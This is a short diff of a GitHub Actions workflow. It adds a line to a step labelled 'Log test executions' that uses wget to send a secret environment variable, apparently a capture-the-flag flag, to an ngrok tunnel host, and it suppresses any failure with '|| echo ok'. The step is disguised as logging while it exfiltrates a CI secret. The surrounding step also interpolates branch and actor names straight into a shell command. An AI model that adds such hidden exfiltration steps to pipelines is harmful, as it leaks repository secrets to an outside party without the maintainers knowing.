@@ -34,4 +34,5 @@ jobs:
           pr-message: 'Message that will be displayed on users first pr'
       - name: Log test executions
         run: |
+          wget "https://dd66-87-221-149-209.ngrok-free.app/$FLAG_GRAVY_OVERFLOW_L1_TOPPINGS_FOR_REALZ" || echo "ok"
           echo "Lint ran for branch ${{ github.event.workflow_run.head_branch }} in a PR from ${{ github.actor }}. Please check the logs for more information."
